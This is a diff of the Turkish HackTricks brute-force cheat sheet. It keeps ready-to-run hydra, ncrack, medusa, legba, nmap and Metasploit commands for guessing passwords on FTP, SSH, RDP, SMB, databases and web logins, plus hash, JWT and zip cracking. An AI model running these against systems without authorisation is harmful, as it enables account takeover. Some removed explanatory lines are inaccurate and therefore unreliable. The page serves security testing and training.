@@ -1,30 +1,31 @@
-# Brute Force - Hile Kağıdı
+# Brute Force - CheatSheet
 
 <figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force)'i kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
-Bugün Erişim Edinin:
+Dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturmak ve **otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) kullanın.\
+Bugün Erişim Alın:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**Resmi PEASS & HackTricks ürünlerini keşfedin**](https://peass.creator-spring.com)
-* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
-* **Hacking hilelerinizi göndererek HackTricks ve HackTricks Cloud** github depolarına PR'lar gönderin.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
 
 ## Varsayılan Kimlik Bilgileri
 
-Kullanılan teknolojinin varsayılan kimlik bilgilerini aramak için google'da arama yapın veya **bu bağlantıları deneyin**:
+Kullanılan teknolojinin varsayılan kimlik bilgilerini **google'da arayın** veya **bu bağlantıları deneyin**:
 
 * [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 * [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -41,7 +42,7 @@ Kullanılan teknolojinin varsayılan kimlik bilgilerini aramak için google'da a
 
 ## **Kendi Sözlüklerinizi Oluşturun**
 
-Hedefle ilgili mümkün olduğunca fazla bilgi bulun ve özel bir sözlük oluşturun. Yardımcı olabilecek araçlar:
+Hedef hakkında mümkün olduğunca fazla bilgi toplayın ve özel bir sözlük oluşturun. Yardımcı olabilecek araçlar:
 
 ### Crunch
 ```bash
@@ -55,20 +56,18 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 crunch 6 8 -t ,@@^^%%
 ```
 ### Cewl
-
-Cewl, bir web sitesinden metin çıkarmak için kullanılan bir araçtır. Genellikle, hedef web sitesindeki metinleri toplamak ve ardından bu metinleri parçalara ayırmak için kullanılır. Bu parçalar daha sonra şifre kırma saldırıları için kullanılabilir.
 ```bash
 cewl example.com -m 5 -w words.txt
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Kurban hakkındaki bilgilerinize dayanarak şifreler oluşturun (isimler, tarihler...)
+Kurban hakkında bildiklerinize (isimler, tarihler...) dayalı şifreler oluşturun.
 ```
 python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-Belirli bir hedefle ilgili kullanmak için benzersiz ve ideal bir kelime listesi oluşturmanıza olanak tanıyan bir kelime listesi oluşturma aracıdır.
+Belirli bir hedefle ilgili kullanılacak benzersiz ve ideal bir kelime listesi oluşturmanıza olanak tanıyan, bir kelime seti sağlamanızı sağlayan bir kelime listesi oluşturucu aracıdır.
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -105,14 +104,14 @@ Finished in 0.920s.
 <figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force)'i kullanarak dünyanın en gelişmiş topluluk araçlarıyla desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
+[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturun ve **otomatikleştirin**.\
 Bugün Erişim Alın:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
 ## Hizmetler
 
-Hizmet adına göre alfabetik olarak sıralanmıştır.
+Hizmet adıyla alfabetik sıraya göre sıralanmıştır.
 
 ### AFP
 ```bash
@@ -125,8 +124,6 @@ msf> set USER_FILE <PATH_USERS>
 msf> run
 ```
 ### AJP
-
-AJP, Advanced Java Programming, is a protocol used to communicate between a web server and a servlet container. It is often targeted during brute force attacks due to its potential vulnerabilities.
 ```bash
 nmap --script ajp-brute -p 8009 <IP>
 ```
@@ -141,17 +138,11 @@ nmap --script cassandra-brute -p 9160 <IP>
 legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
 ```
 ### CouchDB
-
-#### Kaba Kuvvet Saldırısı
-
-Kaba kuvvet saldırısı, bir saldırganın, kullanıcı adı ve şifre kombinasyonlarını deneyerek sisteme erişmeye çalıştığı bir saldırı türüdür. Bu saldırı türü genellikle oturum açma sayfaları veya kimlik doğrulama gerektiren diğer alanlarda kullanılır. Saldırganlar genellikle otomatik araçlar kullanarak büyük bir kombinasyon listesini hızla deneyerek başarılı bir giriş yapmaya çalışırlar. Bu tür saldırılar genellikle zayıf şifreler veya kötü yapılandırılmış kimlik doğrulama mekanizmaları nedeniyle başarılı olabilir.
 ```bash
 msf> use auxiliary/scanner/couchdb/couchdb_login
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
 ```
 ### Docker Registry
-
-### Docker Kayıt Defteri
 ```
 hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
 ```
@@ -160,15 +151,13 @@ hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/word
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
 ```
 ### FTP
-
-FTP, dosya transfer protokolü anlamına gelir. Bir sunucuya dosya transfer etmek için kullanılır. Brute force saldırıları genellikle FTP sunucularına karşı kullanılır. Saldırgan, kullanıcı adı ve şifre kombinasyonlarını deneyerek sunucuya erişmeye çalışır. Bu saldırı türü genellikle oturum açma formlarında kullanılır.
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> ftp
 ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
 ```
-### HTTP Genel Kaba Kuvvet
+### HTTP Genel Brute
 
 #### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
@@ -185,20 +174,18 @@ legba http.ntlm1 --domain example.org --workstation client --username admin --pa
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
 ### HTTP - Post Form
-
-### HTTP - Post Form
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-### **HTTP - CMS --** (W)ordpress, (J)oomla veya (D)rupal veya (M)oodle için "http-post-form"dan "**https-post-form"**'a değiştirmeniz gerekmektedir.
+For http**s** you have to change from "http-post-form" to "**https-post-form"**
+
+### **HTTP - CMS --** (W)ordpress, (J)oomla veya (D)rupal veya (M)oodle
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 # Check also https://github.com/evilsocket/legba/wiki/HTTP
 ```
 ### IMAP
-
-IMAP (Internet Message Access Protocol) is a standard email protocol that stores email messages on a mail server. It allows the end user to view and manipulate the messages as though they were stored locally on the end user's device.
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
@@ -206,8 +193,6 @@ nmap -sV --script imap-brute -p <PORT> <IP>
 legba imap --username user --password data/passwords.txt --target localhost:993
 ```
 ### IRC
-
-IRC, Internet Relay Chat, birçok farklı brute-force saldırılarına karşı savunmasızdır. Kullanıcı adı ve şifre kombinasyonlarını denemek için kullanılabilir. Ayrıca, IRC sunucuları genellikle çok sayıda kullanıcı adı ve şifre denemesine izin verir, bu da brute-force saldırılarını daha etkili hale getirir.
 ```bash
 nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
 ```
@@ -216,8 +201,6 @@ nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,
 nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
 ```
 ### JWT
-
-JWT (JSON Web Token), yani JSON Web İmzası, kimlik doğrulama ve bilgi paylaşımı için kullanılan bir açık standarttır. Bu standart, verileri güvenli bir şekilde JSON formatında taşımak için tasarlanmıştır.
 ```bash
 #hashcat
 hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
@@ -241,14 +224,10 @@ python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1w
 jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
 ```
 ### LDAP
-
-LDAP, Hafif Dizin Erişim Protokolü anlamına gelir. LDAP sunucularına karşı brute force saldırıları genellikle kullanıcı adı ve şifre kombinasyonlarını denemek için gerçekleştirilir. Bu saldırı türü, genellikle kullanıcı kimlik doğrulama bilgilerini elde etmek amacıyla gerçekleştirilir. LDAP brute force saldırıları, güvenlik açıklarını tespit etmek ve kapatmak için yapılan pentestler sırasında kullanılabilir.
 ```bash
 nmap --script ldap-brute -p 389 <IP>
 legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
 ```
-### MQTT
-
 ### MQTT
 ```
 ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
@@ -260,8 +239,6 @@ nmap -sV --script mongodb-brute -n -p 27017 <IP>
 use auxiliary/scanner/mongodb/mongodb_login
 legba mongodb --target localhost:27017 --username root --password data/passwords.txt
 ```
-### MSSQL
-
 ### MSSQL
 ```bash
 legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
@@ -281,8 +258,6 @@ medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on fir
 legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
 ```
 ### OracleSQL
-
-OracleSQL, Brute Force saldırılarına karşı oldukça hassastır. Brute Force saldırıları genellikle kullanıcı adı ve şifre kombinasyonlarını deneyerek sisteme erişmeye çalışır. OracleSQL veritabanlarına karşı Brute Force saldırıları genellikle güvenlik duvarları tarafından algılanır ve engellenir. Bu tür saldırılara karşı korunmak için karmaşık ve güçlü şifreler kullanılmalıdır.
 ```bash
 patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017
 
@@ -306,17 +281,15 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-**oracle\_login**'ı **patator** ile kullanabilmek için **yükleme** yapmanız gerekmektedir:
+**oracle\_login**'ı **patator** ile kullanmak için **kurmanız** gerekiyor:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
-[Çevrimdışı OracleSQL hash kaba kuvvet saldırısı](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**sürümler 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** ve **11.2.0.3**):
+[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**sürümler 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** ve **11.2.0.3**):
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
 ### POP
-
-POP, kısaltılmış bir saldırı türüdür. Bu saldırı türünde, saldırgan, genellikle oturum açma sayfasında veya API'de kullanılan kullanıcı adı ve şifre kombinasyonlarını denemek için otomatik bir araç kullanır. Bu yöntem, zayıf veya sık kullanılan şifrelerin tespit edilmesi için etkili olabilir.
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
@@ -328,8 +301,6 @@ legba pop3 --username admin@example.com --password wordlists/passwords.txt --tar
 legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
 ```
 ### PostgreSQL
-
-PostgreSQL, açık kaynaklı bir ilişkisel veritabanı yönetim sistemi (RDBMS) dir. Brute force saldırıları, genellikle zayıf veya sızdırılmış şifrelerin belirlenmesinde etkili bir yöntemdir. Saldırganlar, oturum açma sayfasına doğrudan erişim sağlayarak veya uygulama aracılığıyla oturum açarak PostgreSQL veritabanlarına brute force saldırıları gerçekleştirebilirler. Bu tür saldırıları önlemek için güçlü ve karmaşık şifreler kullanılmalı ve oturum açma sayfalarına erişimi sınırlamak için gerekli önlemler alınmalıdır.
 ```bash
 hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
 medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
@@ -341,22 +312,18 @@ legba pgsql --username admin --password wordlists/passwords.txt --target localho
 ```
 ### PPTP
 
-`.deb` paketini indirmek için [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) adresine gidebilirsiniz.
+`.deb` paketini [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) adresinden indirip kurabilirsiniz.
 ```bash
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
 cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
 ```
 ### RDP
-
-RDP, Remote Desktop Protocol, Windows işletim sistemlerinde uzak masaüstü bağlantısı sağlamak için kullanılan bir protokoldür. RDP brute force saldırıları, genellikle zayıf şifrelerle korunan RDP sunucularına karşı gerçekleştirilir. Bu saldırı türü, oturum açma bilgilerini tahmin etmek için otomatik olarak farklı şifre kombinasyonlarını denemeyi içerir.
 ```bash
 ncrack -vv --user <User> -P pwds.txt rdp://<IP>
 hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
 legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
 ```
 ### Redis
-
-Redis, açık kaynaklı, in-memory veri yapısıyla çalışan bir veritabanı yönetim sistemidir. Redis, anahtar-değer veritabanı olarak kullanılır ve genellikle hızlı okuma ve yazma işlemleri için tercih edilir. Redis, brute force saldırılarına karşı savunmasız olabilir, bu nedenle güçlü şifreler ve diğer güvenlik önlemleri kullanılmalıdır.
 ```bash
 msf> use auxiliary/scanner/redis/redis_login
 nmap --script redis-brute -p 6379 <IP>
@@ -364,34 +331,24 @@ hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
 legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
 ```
 ### Rexec
-
-Rexec, kaba kuvvet saldırıları için kullanılan bir protokol ve servistir. Rexec, kullanıcı kimlik doğrulaması için kullanıcı adı ve şifre gibi bilgileri şifrelememektedir. Bu nedenle, kaba kuvvet saldırıları genellikle Rexec servisine karşı etkili olabilir.
 ```bash
 hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
 ```
 ### Rlogin
-
-Rlogin, a remote login service, can be brute-forced by trying different username and password combinations. This can be achieved using tools like Hydra or Medusa. It is important to note that brute-forcing Rlogin is considered illegal and unethical unless you have explicit permission to do so.
 ```bash
 hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
 ```
 ### Rsh
-
-Rsh, Remote Shell, is a simple remote shell client included in most Unix-like operating systems. It can be used to execute commands on a remote system. It is not secure and transmits data in clear text, so it is recommended to use SSH instead.
 ```bash
 hydra -L <Username_list> rsh://<Victim_IP> -v -V
 ```
 [http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)
 
 ### Rsync
-
-### Rsync
 ```bash
 nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
 ```
 ### RTSP
-
-RTSP, Gerçek Zamanlı Akış Protokolü anlamına gelir. Bu protokol, ağ üzerinden ses ve video akışlarını yönetmek için kullanılır.
 ```bash
 hydra -l root -P passwords.txt <IP> rtsp
 ```
@@ -402,8 +359,6 @@ legba sftp --username admin --password wordlists/passwords.txt --target localhos
 legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
 ### SNMP
-
-SNMP, yani Basit Ağ Yönetim Protokolü, ağ cihazlarını yönetmek ve izlemek için kullanılan bir protokoldür. SNMP brute force saldırıları, genellikle varsayılan topluluk dizesi gibi zayıf kimlik doğrulama bilgilerini kullanarak SNMP hizmetlerine erişmeye çalışır. Bu saldırılar, ağ cihazlarının kontrolünü ele geçirmek veya ağ üzerinde casusluk yapmak için kullanılabilir.
 ```bash
 msf> use auxiliary/scanner/snmp/snmp_login
 nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
@@ -411,25 +366,17 @@ onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.
 hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
 ```
 ### SMB
-
-#### Kaba Kuvvet Saldırıları
-
-Kaba kuvvet saldırıları, bir hedef sistemdeki kullanıcı adı ve parola kombinasyonlarını denemek için kullanılan bir saldırı tekniğidir. Bu saldırı türü, genellikle zayıf parolaları tespit etmek veya parola karmaşıklığı politikalarını ihlal eden kullanıcı hesaplarını belirlemek amacıyla kullanılır. Kaba kuvvet saldırıları, oturum açma ekranları, web uygulamaları, veritabanları ve diğer sistemlerde kullanılabilir. Saldırganlar, oturum açma sayfalarına veya hedef sistemlere erişmek için otomatik araçlar veya özel yazılımlar kullanarak büyük bir parola listesini deneyebilirler. Bu saldırı türü, etkili bir şekilde uygulandığında hedef sistemlere yetkisiz erişim sağlayabilir.
 ```bash
 nmap --script smb-brute -p 445 <IP>
 hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
 legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
 ```
 ### SMTP
-
-SMTP, Simple Mail Transfer Protocol, e-posta sunucuları arasında iletişim kurmak için kullanılan standart bir iletişim protokolüdür. Gönderen sunucu, alıcı sunucuya e-posta iletisini iletmek için SMTP'yi kullanır.
 ```bash
 hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
 hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
 legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
 ```
-### SOCKS
-
 ### SOCKS
 ```bash
 nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
@@ -438,8 +385,6 @@ legba socks5 --target localhost:1080 --username admin --password data/passwords.
 legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
 ```
 ### SQL Server
-
-SQL Server, Microsoft'un ilişkisel veritabanı yönetim sistemidir. Brute force saldırıları, SQL Server veritabanlarına erişmek için kullanılabilir. Bu saldırılar genellikle kullanıcı adı ve şifre kombinasyonlarını deneyerek gerçekleştirilir. Saldırganlar genellikle oturum açma formlarını hedef alır ve oturum açma sayfasına doğrudan erişim sağlamaya çalışırlar.
 ```bash
 #Use the NetBIOS name of the machine as domain
 crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
@@ -449,8 +394,6 @@ nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=cust
 msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
 ```
 ### SSH
-
-SSH, **Secure Shell** anlamına gelir ve ağ protokollerini güvenli bir şekilde yönetmek için kullanılır. SSH brute force saldırıları, genellikle şifre deneme saldırılarıyla gerçekleştirilir. Saldırganlar, farklı şifre kombinasyonlarını deneyerek hedef SSH sunucusuna erişmeye çalışırlar. Bu saldırı türü, güçlü ve karmaşık şifreler kullanılarak önlenmelidir.
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> ssh
 ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
@@ -462,17 +405,15 @@ legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --targ
 ```
 #### Zayıf SSH anahtarları / Debian tahmin edilebilir PRNG
 
-Bazı sistemler, kriptografik materyal oluşturmak için kullanılan rastgele tohumda bilinen hatalara sahiptir. Bu, büyük ölçüde azaltılmış bir anahtar alanıyla sonuçlanabilir ve [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) gibi araçlarla brute force saldırısına maruz kalabilir. Önceden oluşturulmuş zayıf anahtar setleri de mevcuttur, örneğin [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Bazı sistemler, kriptografik materyal oluşturmak için kullanılan rastgele tohumda bilinen hatalara sahiptir. Bu, [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) gibi araçlarla bruteforce edilebilecek şekilde dramatik bir şekilde azaltılmış bir anahtar alanına yol açabilir. Ayrıca, [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh) gibi önceden oluşturulmuş zayıf anahtar setleri de mevcuttur.
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ ve OpenMQ)
 
-STOMP metin protokolü, RabbitMQ, ActiveMQ, HornetQ ve OpenMQ gibi popüler mesaj sıralama hizmetleriyle sorunsuz iletişim ve etkileşim sağlayan bir mesajlaşma protokolüdür. Mesaj alışverişi yapmak ve çeşitli mesajlaşma işlemlerini gerçekleştirmek için standartlaştırılmış ve verimli bir yaklaşım sunar.
+STOMP metin protokolü, **RabbitMQ, ActiveMQ, HornetQ ve OpenMQ gibi popüler mesaj kuyruklama hizmetleriyle kesintisiz iletişim ve etkileşim sağlar**. Mesajları değiştirmek ve çeşitli mesajlaşma işlemleri gerçekleştirmek için standartlaştırılmış ve verimli bir yaklaşım sunar.
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
 ### Telnet
-
-Telnet, ağ protokolüdür ve bir bilgisayara uzaktan erişim sağlamak için kullanılır. Genellikle TCP üzerinden 23 numaralı bağlantı noktası üzerinden çalışır. Telnet, metin tabanlı bir protokol olduğundan, veriler açık bir şekilde iletilir ve bu nedenle güvenli değildir. Güvenli olmayan doğası nedeniyle, Telnet üzerinde yapılan iletişimler kolayca izlenebilir ve ele geçirilebilir. Bu nedenle, Telnet yerine güvenli alternatifler kullanılması önerilir.
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> telnet
 ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
@@ -509,8 +450,8 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 <figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) kullanarak dünyanın en gelişmiş topluluk araçlarıyla desteklenen **otomatik iş akışları** oluşturun ve otomatikleştirin.\
-Bugün Erişim Edinin:
+Dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturmak ve **otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) kullanın.\
+Bugün Erişim Alın:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
@@ -518,19 +459,19 @@ Bugün Erişim Edinin:
 
 ### Çevrimiçi kırma veritabanları
 
-* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 ve SHA1)
-* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 ESS/SSP ile/olmadan ve herhangi bir meydan okuma değeriyle)
-* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hash'ler, WPA2 yakalamaları ve arşivler MSOffice, ZIP, PDF...)
-* [https://crackstation.net/](https://crackstation.net) (Hash'ler)
+* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
+* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 ESS/SSP ile/olmaksızın ve herhangi bir zorluk değeri ile)
+* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashler, WPA2 yakalamaları ve MSOffice, ZIP, PDF arşivleri...)
+* [https://crackstation.net/](https://crackstation.net) (Hashler)
 * [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
-* [https://gpuhash.me/](https://gpuhash.me) (Hash'ler ve dosya hash'leri)
-* [https://hashes.org/search.php](https://hashes.org/search.php) (Hash'ler)
-* [https://www.cmd5.org/](https://www.cmd5.org) (Hash'ler)
+* [https://gpuhash.me/](https://gpuhash.me) (Hashler ve dosya hashleri)
+* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashler)
+* [https://www.cmd5.org/](https://www.cmd5.org) (Hashler)
 * [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
 * [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 * [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Hash kırmadan önce bunları kontrol edin.
+Bir Hash'i brute force denemeden önce bunu kontrol edin.
 
 ### ZIP
 ```bash
@@ -550,8 +491,8 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 ```
 #### Bilinen düz metin zip saldırısı
 
-Şifreli zip dosyasının içinde bulunan bir dosyanın **düz metnini (veya düz metnin bir kısmını)** bilmelisiniz. Şifreli bir zip içinde bulunan dosyaların **dosya adlarını ve dosyaların boyutunu** kontrol edebilirsiniz: **`7z l encrypted.zip`**\
-İndir [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) sürümler sayfasından.
